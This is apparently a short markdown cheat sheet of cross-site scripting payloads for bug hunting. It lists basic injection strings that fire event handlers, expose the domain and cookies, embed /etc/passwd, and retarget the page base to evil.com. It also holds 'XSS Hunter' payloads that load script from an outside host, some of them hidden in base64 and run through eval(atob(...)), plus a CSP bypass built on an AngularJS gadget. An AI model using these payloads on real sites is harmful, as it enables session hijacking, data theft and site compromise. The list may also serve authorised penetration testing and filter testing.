# XSS Payload Collections

### Basic Payload
```
"><img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
"></script><img src=x onerror=prompt(document.domain)>
"><img src=x onerror=prompt(window.cookie)>
"><svg onx onload=prompt(123)>
"><iframe src="file:///etc/passwd">
"><object id="data" data="javascript:alert(123)" width="1000" height="1000">
"><svg/onload=prompt(123)>@gmail.com
"><base href=//evil.com>
"><a href="javascript:alert(123)" onmouseover=prompt(1233)>Click Here</a>
"><NOSCRIPT><p title="</NOSCRIPT><img src=x onerror=prompt(123)>">
```

### XSS Hunter Payload
```
'"></script></textarea></head><script src=https://rioncool222.xss.ht></script>{{7*7}}
"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcmlvbmNvb2wyMjIueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; autofocus>
"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcmlvbmNvb2wyMjIueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>
```

### CSP Bypass Work
```
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script><div ng-app ng-csp id=p ng-click=$event.view.alert(1337)><h1>CLICK ME</h1></div>
```
